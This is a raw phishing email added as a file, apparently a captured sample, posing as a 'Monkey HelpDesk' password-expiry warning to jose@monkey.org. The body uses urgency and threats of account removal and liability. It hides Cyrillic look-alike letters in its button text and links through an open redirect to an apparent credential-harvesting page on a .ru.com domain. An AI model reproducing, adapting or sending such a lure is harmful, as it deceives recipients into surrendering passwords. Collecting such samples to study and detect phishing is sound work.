@@ -1,0 +1,166 @@
+Return-Path: back-up@mt10.com.br
+Delivered-To: jose@monkey.org
+X-FDA: 82751030544.19.7265455
+Received: from vps.adan.guru (unknown [172.96.181.75])
+	by imf14.b.hostedemail.com (Postfix) with ESMTP id 7A86E60003
+	for <jose@monkey.org>; Tue,  5 Nov 2024 06:15:57 +0000 (UTC)
+Authentication-Results: imf14.b.hostedemail.com;	dkim=none;	spf=softfail
+ (imf14.b.hostedemail.com: 172.96.181.75 is neither permitted nor denied by
+ domain of back-up@mt10.com.br) smtp.mailfrom=back-up@mt10.com.br;	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1730787216;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:content-transfer-encoding:in-reply-to:	 references;
+ bh=P2Muz3iYXzUxp7Tr2IRJuILXtaOqt2GhyzG8C3uyf1E=;
+	b=jkAQWkEhp8SoiXPZUzApkw7tbYCiN6UYg+urpgbLqKO5w5c98mAHOkyPH0ZDz0n93NeE9h
+	iaf8eVmji3R+o/LCZ+unddcj+4wXrY1WeJFI0vERVOexHDL3A4l62EpmWkVKWJASjI/M2Z
+	85g6Y82UTlrzFMX1mRNbEQ6TlmADOck=
+ARC-Authentication-Results: i=1;	imf14.b.hostedemail.com;	dkim=none;
+	spf=softfail (imf14.b.hostedemail.com: 172.96.181.75 is neither permitted nor
+ denied by domain of back-up@mt10.com.br) smtp.mailfrom=back-up@mt10.com.br;
+	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1730787216; a=rsa-sha256;
+	cv=none;
+	b=TNI+J0BkcClwAYFWb1YhY3gdEsQi/nV/LTk4+Cxid+G7jw1Ow/mIfX8g1uAjggXpHN3MBg
+	QPmRk5NkBBmSvXlzAYv2Uew2FW/4LubLhrAjewJP894UazgroEGl7EMj5dOmSY3hW6gVHq
+	lBqzv2TdclNkc9rcWNQ0gkQjjs7amBA=
+Received: from [103.114.217.9] (port=61294 helo=mt10.com.br)	by vps.adan.guru
+ with esmtpsa  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384	(Exim
+ 4.96.2)	(envelope-from <back-up@mt10.com.br>)	id 1t344d-0001My-1m	for
+ jose@monkey.org;	Tue, 22 Oct 2024 01:52:48 +0000
+From: Monkey HelpDesk  <back-up@mt10.com.br>
+To: jose@monkey.org
+Subject: IMPORTANT: You have 1 new message(s) in your Mailbox =?utf-8?b?4pyF?=
+Date: 22 Oct 2024 14:53:15 -0700
+Message-ID: <20241022145315.74F18C88C30A244D@mt10.com.br>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_000_0012_188A4807.3A7878CC"
+X-AntiAbuse:
+ This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - oldvps.adan.guru
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - mt10.com.br
+X-Get-Message-Sender-Via:
+ oldvps.adan.guru: authenticated_id: contact@manufacturerafroes.com
+X-Authenticated-Sender: oldvps.adan.guru: contact@manufacturerafroes.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspam-User: 
+X-Rspamd-Queue-Id: 7A86E60003
+X-Stat-Signature: rb6y1gk1dr3x6r7nt3guq13hp6sofztw
+X-Rspamd-Server: rspam10
+X-Spam-Status: Yes, score=16.68
+X-HE-Tag: 1730787357-445189
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1+3UKbS96QZCL3KHEbEYbgpeejDeXlI1bdTgukg6mb0fJx?=
+ =?utf-8?q?aKSuFymobUM7oHTIep95WXLF+eT3IimxBUIE1YXYyDZDNKL3WuwZln6PuTgY/sL88?=
+ =?utf-8?q?2wEnaaKJqGh2ER32T7aP8APn0zCdW1ePNkmreqPwOq1ar+zZcZiQmlGocTOBMToO+?=
+ =?utf-8?q?fQKWAjOil6Fh9/6aS0gycn5WlUFv/9YoHyD5kvgOjvqBabadCx5e5bcnR575LzGzA?=
+ =?utf-8?q?TsuaTMfs2udXSsF9dPZib2289DDqOH87DZbpBVokrd86dOd7c4AzDC8027syI/GM7?=
+ =?utf-8?q?vckGhmT1bn+9qt682nfotHT9o3FK4DmkYh5/uHF15DWctyYHJkoX041nwbF0Q85xp?=
+ =?utf-8?q?qrEe0D9EX+ZQVro84HtNCFAp+PRvH1jpoBKa+R0RRjYcr7kE+dI0mYQVBLF3Qn3R0?=
+ =?utf-8?q?uYQzd3rS6eT3Lfh683krd/Qgv+V1xw8xlAV7g/KvDU+ARgMLhNx9u3bVWAkPvzx9C?=
+ =?utf-8?q?3mL4iWrfG3on6WIEqzycdK8hizwP8RHl6Njnqvgwz8IRzVNJ1mj66UXE1N5JTKLNb?=
+ =?utf-8?q?zNXhMaqJwOND/KCr7qjpKSs7XbwD/R94lV1N0T7w0+EvcpmvrDQwPU6wZlJ9HLmgt?=
+ =?utf-8?q?/hpt0ToLjFGl+p1v3KS9boQbC09lqJD+jtZu7ykHePRGdWzJIzp7w4WPeQFJ1n27d?=
+ =?utf-8?q?C1PNxb0P3qRdwg9zQofRsJPoh7J6VUckEFS1iUQNylSDPgKRqd/JHI+gSNbNw6tlC?=
+ =?utf-8?q?vX57QEflMucPZv6arSeKeDjoZLdS4ZG7WRrzePo7VlP5P3elxieG/qoZuZcdNblAe?=
+ =?utf-8?q?czfgJqHqQOx3FJEEG7XYhIsNWLXWfq1ZFcsUQAuAJtQZ3cm/Y8pOPEL/A0oVv1pUq?=
+ =?utf-8?q?/wk6pYdw1f63jC7mVDcsrjsqqpFcWqPQ9+g41nTZkMJ447Xkmqmetlat5aD9wkv7x?=
+ =?utf-8?q?UVogtZB6vIrG2UXHvH4dFy_U16Zl589yBs0CDTBcGQanrehHnhTQ09tQ0UCffGgFf?=
+ =?utf-8?q?x7bWriODgM9GdMPpEVGBhtwJAJ5mhghi4h9a7TT8TXrKWK0+M7tKuWiplIMh5gW5M?=
+ =?utf-8?q?ruXJ/dgnhRQkZR4SPybfOujJAR3wTpm+MmSw0jIJaSpVf+6R8xA0lD7YQj8RvlLVE?=
+ =?utf-8?q?NBPUcCSI/v2i4Esr7QFj38Zn3rLcLveeLa7aqSgmp0OOzI+zZFySF8O8jYvN+Lt4/?=
+ =?utf-8?q?OEioUlZNuURDv7HKuARTGzGNmrSf/MVokee5+ZkLh0Y92/2/Y035o/qFatvhfy4bT?=
+ =?utf-8?q?tXTkVAmuaXb9W+mXYFuqZlpPQeTNed8eUazOsbNIc8Nzn/toV04mblJMlDAH3ZA2U?=
+ =?utf-8?q?WjXEXgUKKrwZ//gg56a8Sq4QwIGHx6qJTsjdiZdyz3eyMv5wSpNYjlAzTJs8NpYIY?=
+ =?utf-8?q?CV2BeYyRasFi8tia4u4K+xRjKO2LDIea7CqAK2MXASu6sQGQwETuvYFKXaFK3NxnK?=
+ =?utf-8?q?8VnJFUmuGQ=3D=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 323
+
+
+------=_NextPart_000_0012_188A4807.3A7878CC
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+no text
+------=_NextPart_000_0012_188A4807.3A7878CC
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+	<title></title>
+	<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+
+<br>
+<span style=3D"font-family: Times New Roman;">jose@monkey.org&nbsp;removal =
+from this server has been approved and innitiated due to ignorance<br>
+of last verification warning.<br>
+<br>
+The password for&nbsp;&nbsp;<span style=3D"font-family: Times New Roman;">j=
+ose@monkey.org </span>&nbsp;is set to expire Today, 10/22/2024 2:53:15 p.m.=
+</span><br>
+<span style=3D"font-family: Times New Roman;">Continue using the same passw=
+ord by clicking the button below to avoid login interruption</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+<a style=3D"padding: 7px; color: rgb(255, 255, 255); font-size: 15px; text-=
+decoration: none; vertical-align: baseline; box-sizing: border-box; backgro=
+und-color: rgb(255, 108, 44);" href=3D"http://www.espointehague.net/wordpre=
+ss/?wptouch_switch=3Dmobile&amp;redirect=3Dhttps://acapizariamos.ru.com/use=
+/cp2022/cp2022/CP.html?#jose@monkey.org" target=3D"_blank" rel=3D"noopener"=
+><span style=3D"text-align: left; text-indent: 0px; font-size: 14px;"><span=
+ style=3D"box-sizing: border-box;">
+<span style=3D"font-family: roboto , sans-serif;"><span style=3D"white-spac=
+e: normal;"><span style=3D"word-spacing: 0px;"><span style=3D"font-weight: =
+400;"><span style=3D"color: rgb(44, 54, 58);"><span style=3D"font-style: no=
+rmal;"><span style=3D"background-color: rgb(239, 108, 0);"><span style=3D"b=
+ackground-color: rgb(243, 105, 12);">K&#1077;&#1077;p Same Login Access</sp=
+an></span></span></span></span></span></span></span></span></span></a><br>
+<br>
+<br>
+<span style=3D"text-align: left; text-indent: 0px; font-size: 15px;"><span =
+style=3D"box-sizing: border-box;"><span style=3D"font-family: courier new ,=
+ courier , monospace;"><span style=3D"white-space: normal;"><span style=3D"=
+word-spacing: 0px;"><span style=3D"font-weight: 400;"><span style=3D"color:=
+ rgb(36, 36, 36);"><span style=3D"font-style: normal;"><span style=3D"backg=
+round-color: rgb(255, 255, 255);">N&#1086;t&#1077;:</span></span></span></s=
+pan></span></span></span></span></span>
+ &nbsp;&nbsp; <span style=3D"text-align: left; text-indent: 0px; font-size:=
+ 14px;"><span style=3D"box-sizing: border-box;"><span style=3D"font-family:=
+ courier new , courier , monospace;"><span style=3D"white-space: normal;"> =
+<span style=3D"word-spacing: 0px;"><span style=3D"font-weight: 400;"><span =
+style=3D"color: rgb(255, 0, 0);"><span style=3D"font-style: normal;"><span =
+style=3D"background-color: rgb(255, 255, 255);"><span style=3D"color: rgb(2=
+49, 24, 6);">
+You are liable for any loss due to skipped validation prompts.</span></span=
+></span></span> </span></span></span></span></span></span><br>
+<br>
+<br>
+<span style=3D"text-align: left; text-indent: 0px; font-size: 15px;"><span =
+style=3D"box-sizing: border-box;"><span style=3D"font-family: roboto , sans=
+-serif;"><span style=3D"white-space: normal;"><span style=3D"word-spacing: =
+0px;"><span style=3D"font-weight: 400;"><span style=3D"color: rgb(36, 36, 3=
+6);"><span style=3D"font-style: normal;"><span style=3D"background-color: r=
+gb(255, 255, 255);"><span style=3D"font-family: Times New Roman;"><font col=
+or=3D"#000000" size=3D"3">
+Monkey HelpDesk</font></span></span></span></span></span></span></span></sp=
+an></span></span></p>
+
+
+</body></html>
+------=_NextPart_000_0012_188A4807.3A7878CC--
+
+
